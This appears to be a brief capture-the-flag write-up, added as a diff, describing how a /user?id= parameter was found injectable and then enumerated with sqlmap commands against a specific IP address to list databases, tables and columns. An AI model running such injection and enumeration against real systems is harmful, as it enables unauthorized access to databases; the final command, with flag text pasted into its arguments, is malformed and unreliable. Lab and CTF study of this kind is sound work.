@@ -1,0 +1,13 @@
+since our hint is /user?id=
+we can try using that while modifying the url of the website
+and we get a sqlalchemy.exc.DataError as the result
+it's a python library so we can try using sqlmap to find more information
+once we find the injection point we should find the databases and we can use -dbs for that
+lets check whats inside --tables
+we only have the first part of the flag so we should use -T ... --columns 
+
+
+
+sqlmap -u http://34.89.210.219:30415/user?id=1 --dbs
+sqlmap -u http://34.89.210.219:30415/user?id=1 -D public --tables
+sqlmap -u http://34.89.210.219:30415/user?id=1 -D public --tables ctf{afonasoifoansofnasnfkasnfkasfasknfkasnkfsakfoasfnnasfnaskf --columns
